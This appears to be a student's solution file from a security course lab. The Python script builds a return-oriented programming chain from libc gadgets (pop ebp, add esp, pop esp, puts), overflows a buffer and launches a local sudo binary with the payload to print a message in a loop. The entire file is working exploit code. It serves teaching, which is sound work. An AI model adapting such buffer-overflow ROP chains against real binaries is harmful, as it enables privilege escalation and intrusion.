import os, sys

import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'

def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.PUTS` to get the address of the `puts` function.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.
    fillBuff = 'a'*(addresses.CRITICAL_LENGTH)
    storePuts = addresses.address_to_bytes(search.find('pop ebp', condition = lambda x: x%16 >0))
    put_addr = addresses.address_to_bytes(addresses.PUTS)
    skipToLoop = addresses.address_to_bytes(search.find('add esp , 4', condition = lambda x: x%16 >0))
    address_to_string = addresses.address_to_bytes(addresses.START + 28)
    goBack = addresses.address_to_bytes(search.find('pop esp', condition = lambda x: x%16 >0))
    loop_addr = addresses.address_to_bytes(addresses.START + 8)
    messege = assemble.assemble_data(".ascii \"" + get_string(201627494) + "\"")

    code = fillBuff + storePuts + put_addr + put_addr + skipToLoop + address_to_string + goBack + loop_addr +  messege
    return code
   
    #print ":".join("{:02x}".format(ord(c)) for c in code)

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
